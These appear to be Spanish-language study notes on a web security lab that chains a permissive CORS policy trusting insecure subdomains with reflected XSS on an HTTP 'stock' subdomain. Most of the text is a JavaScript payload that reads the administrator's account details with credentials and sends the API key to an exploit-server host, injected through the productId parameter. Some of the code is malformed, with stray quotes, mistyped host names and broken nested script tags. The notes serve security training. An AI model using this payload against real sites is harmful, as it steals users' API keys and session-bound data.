En esta clase continuamos con la explotación del laboratorio anterior, donde la configuración CORS del servidor acepta solicitudes desde cualquier subdominio, incluso si estas provienen de un origen no seguro (HTTP).

Profundizamos en cómo aprovechar una vulnerabilidad de XSS reflejado en un subdominio que opera sobre HTTP, lo cual nos permite inyectar y ejecutar un script malicioso. Dicho script accede al endpoint sensible de la cuenta del administrador y, gracias a la configuración permisiva del servidor, la clave API es expuesta. Este valor es redirigido al servidor de explotación para completar con éxito el laboratorio.

----


Vemos la peticion hacia AccounDetails

    Origin: test.com
    Origin: null

Si probamos con subdominios tambien funciona

    Origin: https://test.burpsuite-lab.net

ahora debemos de buscar alguna seccion donde haya subdominios, en los productos, hay una seccion de stock

```javascript

<script>
    var req = new XMLHttpRequest();
    req.onload = function(){
        location = 'https://exploit-server/?apikey= '' + btoa(req.responseText);
    };
    req.open('GET','https://burpsuite/accountDetails',true);
    req.withCredentials = true;
    req.send();
</script>
```

Hay un apartado donde hay un subdominio, junto con un XSS, y desde alli forzamos al usuario a que accione correctamente el CORS

```javascript
<script>
    document.location = "http://stock.burpsiote.com/?productId=1&store=1";
    document.location = "http://stock.burpsiote.com/?productId=<XSS>&store=1";>
    document.location = "http://stock.burpsiote.com/?productId=<script>
    var req = new XMLHttpRequest();
    req.onload = function(){
        location = 'https://exploit-server/?apikey= '' + btoa(req.responseText);
    };
    req.open('GET','https://burpsuite/accountDetails',true);
    req.withCredentials = true;
    req.send();
</script>&store=1";>
</script>


```

URLencodear el caracter "+" %2b